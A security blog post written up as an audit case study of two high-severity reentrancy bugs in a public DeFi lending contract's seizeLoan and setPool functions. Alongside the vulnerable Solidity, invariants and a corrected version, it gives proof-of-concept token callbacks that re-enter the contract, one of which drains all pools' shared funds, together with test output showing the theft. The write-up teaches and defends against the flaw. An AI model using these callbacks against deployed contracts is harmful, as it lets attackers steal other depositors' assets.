---
title: "Move state before interactions"
description: "A reentrancy case study in loan settlement, stale records, and why checks-effects-interactions is really about temporal truth."
date: 2023-07-24
category: smart-contracts
tags:
  - solidity
  - reentrancy
  - defi
featured: false
redacted: false
---

During a review of the public [2023-07 Beedle contest repository](https://github.com/Cyfrin/2023-07-beedle), I found two high-severity reentrancy paths in the lender contract.

The external calls happened in different workflows, but the root cause was the same: token transfer occurred while storage still represented the old world. A callback-capable token could re-enter and make a second decision against stale state.

These are not "ERC-777-only" findings. ERC-777 is a convenient proof mechanism. Any supported token that invokes receiver-controlled code, including customized ERC-20-like tokens, turns the transfer into an external call boundary.

## H-01: a seized loan remains live during transfer

In `seizeLoan`, collateral was sent to the lender before pool accounting was finalized and before the loan was deleted.

```solidity
function seizeLoan(uint256[] calldata loanIds) public {
  // validation omitted

  IERC20(loan.collateralToken).transfer(
    loan.lender,
    loan.collateral - govFee
  );

  pools[poolId].outstandingLoans -= loan.debt;

  // The loan remains readable and actionable until this point.
  delete loans[loanId];
}
```

Source: [`Lender.sol` seizure path](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L565-L567).

When the token invokes the lender during `transfer`, the callback can call `giveLoan` while `loans[loanId]` still exists. The stale loan is moved to a matching pool. Control then returns to `seizeLoan`, which continues accounting against the old pool and deletes the loan record.

The minimal callback in my Foundry proof of concept was:

```solidity
contract AttackContract is IERC20WithCallback {
  Lender lender;
  uint256[] loanIds;
  bytes32[] destinationPoolIds;

  function beforeTokenTransfer(address, uint256) external {
    lender.giveLoan(loanIds, destinationPoolIds);
  }
}
```

## Walking the stale-loan transition

1. The attacker's pool has three loans of 100 tokens each.
2. Loan `0` enters auction and becomes eligible for seizure.
3. Another lender creates a compatible destination pool.
4. `seizeLoan([0])` starts and transfers collateral to the attacker.
5. The collateral token calls `beforeTokenTransfer`.
6. The callback calls `giveLoan([0], [destinationPool])` against the still-live loan.
7. `giveLoan` updates both pools as though the loan moved normally.
8. Execution returns to `seizeLoan`, which subtracts debt from the old pool again.
9. `seizeLoan` deletes loan `0`.

The destination pool now reports outstanding debt for a loan that no longer exists. The borrower cannot repay that missing record, and the pool totals no longer describe the protocol's obligations.

I ran the scenario with:

```bash
forge test --match-path test/SeizeLoanToGiveLoan.t.sol -vv
```

The significant state change was:

```text
Before callback sequence
Old pool balance:          9700.000000000000000000
New pool balance:         10000.000000000000000000
Old pool outstanding:       300.000000000000000000
New pool outstanding:         0.000000000000000000

After seize returns
Old pool balance:          9809.036986301369863014
New pool balance:          9889.958904109589041096
Old pool outstanding:       100.000000000000000000
New pool outstanding:       110.041095890410958904
```

The values are less important than the contradiction: the new pool has outstanding debt, but the corresponding loan was deleted.

## H-02: setPool withdraws before storing the new balance

The second path was simpler and affected shared custody directly. `setPool` read a pool's current balance, transferred the requested reduction to its lender, and stored the new pool only afterward.

```solidity
function setPool(Pool calldata p) public returns (bytes32 poolId) {
  // checks omitted

  uint256 currentBalance = pools[poolId].poolBalance;

  if (p.poolBalance > currentBalance) {
    IERC20(p.loanToken).transferFrom(
      p.lender,
      address(this),
      p.poolBalance - currentBalance
    );
  } else if (p.poolBalance < currentBalance) {
    IERC20(p.loanToken).transfer(
      p.lender,
      currentBalance - p.poolBalance
    );
  }

  // Effects happen after the interaction.
  pools[poolId] = p;
}
```

Source: [`Lender.sol#setPool`](https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L150-L175).

Assume three pools each deposit 1,000 units of the same callback-capable loan token. The contract holds 3,000 units in shared custody. The attacker owns one of those pools and updates its desired balance from 1,000 to zero.

On the first transfer, the callback re-enters `setPool(p)`. Since `pools[poolId] = p` has not executed, `currentBalance` is still 1,000. The contract sends another 1,000. The callback repeats until the shared token balance is empty.

```solidity
function beforeTokenTransfer(address, uint256 amount) external {
  amountReceived += amount;
  uint256 remaining = loanToken.balanceOf(address(lender));

  if (remaining > 0) {
    lender.setPool(withdrawEverything);
  }
}
```

The proof used three 1,000-token pools:

```bash
forge test --match-test test_reentrancy -vv
```

```text
Before attack
Contract token balance:   3000
Attacker pool balance:    1000
Pool 2 balance:           1000
Pool 3 balance:           1000

After attack
Contract token balance:      0
Attacker pool balance:       0
Pool 2 recorded balance:  1000
Pool 3 recorded balance:  1000
Attacker received:        3000
```

The attacker was economically entitled to withdraw 1,000, but received all 3,000. The other pools still reported 1,000 each even though the contract no longer held their assets.

## The invariants that exposed both findings

For the seizure path:

```text
every outstanding loan amount must correspond to one live, repayable loan record
```

For shared custody:

```text
actual token balance >= sum of all pool balances required for withdrawal
```

After every public transition, both storage relationships and real token balances must agree. Looking only at one mapping or one function's return value would miss the cross-pool damage.

## Fixing the order

For `seizeLoan`, make the loan unusable and update pool accounting before transferring collateral. For `setPool`, store the new pool balance before returning tokens. A reentrancy guard is useful defense in depth, especially across multiple entry points, but it should not be the only reason the accounting is coherent.

```solidity
function setPool(Pool calldata p) public nonReentrant returns (bytes32 poolId) {
  uint256 currentBalance = pools[poolId].poolBalance;
  uint256 refund = currentBalance > p.poolBalance
    ? currentBalance - p.poolBalance
    : 0;

  pools[poolId] = p;

  if (refund > 0) {
    IERC20(p.loanToken).safeTransfer(p.lender, refund);
  }
}
```

The complete implementation still needs to handle deposits and validation, but the ordering is the point: **checks, effects, then interactions**.

The regression suite should use a callback token and assert conservation across every pool, loan record, and actual ERC-20 balance. A passive mock token proves only the non-adversarial path.

*This article preserves the original public source links, proof-of-concept control flow, Foundry commands, observed state, and remediation. Participant-specific contest details are omitted because they do not affect the technical argument.*
